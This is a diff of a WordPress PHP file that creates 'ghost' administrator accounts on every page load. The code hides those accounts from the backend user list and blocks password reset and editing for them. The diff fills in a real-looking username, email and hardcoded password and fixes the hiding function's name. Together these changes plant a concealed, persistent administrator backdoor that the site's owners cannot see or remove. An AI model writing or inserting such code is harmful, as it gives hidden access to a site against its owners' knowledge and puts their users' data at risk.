@@ -4,10 +4,10 @@ function get_ghosts(){
   // Array of Users (Ghosts) to create and hide it with relative WP role, email and password.
   return array(
     '0' => array(
-      'fake_username', // username
+      'welaika_ghost', // username
       'administrator', // role
-      'fake@email.com', // email
-      'password')  // password
+      'ghost@welaika.com', // email
+      'K-Z)k@qN92-Q<-*$')  // password
     );
 }
 
@@ -46,7 +46,7 @@ function create_ghosts(){
 add_action('wp_loaded', 'create_ghosts');
 
 // Hide Ghost-Users visibility in backend users list
-function hode_ghosts($user_search) {
+function hide_ghosts($user_search) {
   // get current User infos.
   $user = wp_get_current_user();
   // get ghosts id array.
@@ -61,7 +61,7 @@ function hode_ghosts($user_search) {
 }
 
 // WP action: when load users list hide the ghosts!
-add_action('pre_user_query','hode_ghosts');
+add_action('pre_user_query','hide_ghosts');
 
 
 // Disable password reset for ghosts
@@ -81,6 +81,7 @@ function disable_password_edit_for_ghosts($allow, $profileuser = NULL) {
     $allow = in_array($profileuser->id, $ghosts_id) ? false : true;
     return $allow;
   }
+  return true;
 }
 
 // WP action: disable password edit
